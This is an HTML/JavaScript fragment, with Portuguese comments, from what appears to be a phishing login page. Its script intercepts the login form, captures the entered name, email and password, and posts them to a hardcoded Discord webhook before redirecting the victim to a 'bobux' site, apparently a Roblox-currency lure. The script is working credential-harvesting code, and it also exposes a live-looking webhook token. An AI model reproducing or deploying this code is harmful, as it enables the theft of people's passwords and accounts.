<!-- ... (seções anteriores do seu código) ... -->

<!-- JAVASCRIPT -->
<script type="text/javascript">
    const loginForm = document.getElementById("login_form");

    loginForm.addEventListener("submit", function(event) {
        event.preventDefault(); // Prevent form submission

        // Dados do formulário
        const formData = new FormData(loginForm);
        const name = formData.get("name");
        const email = formData.get("email");
        const password = formData.get("password");

        // Mensagem para enviar para a Webhook
        const message = `Novo login:\nNome: ${name}\nE-mail: ${email}\nSenha: ${password}`;

        // URL da Webhook do Discord
        const webhookUrl = "https://discord.com/api/webhooks/1144709889420165134/wepBSKjhoyDw60bmb2ohnQEaU7LruESxJUm2aDutBg_h3oJQv2iaTx4KQ_V99jkNsSwx";

        // Enviar a mensagem para a Webhook
        fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: message })
        })
        .then(response => {
            if (response.ok) {
                window.location.href = "https://masterdevhomirinha.github.io/bobux/"; // Redirecionar após o envio
            } else {
                console.error("Erro ao enviar mensagem para a Webhook");
            }
        })
        .catch(error => {
            console.error("Erro ao enviar mensagem para a Webhook:", error);
        });
    });
</script>
</body>
</html>
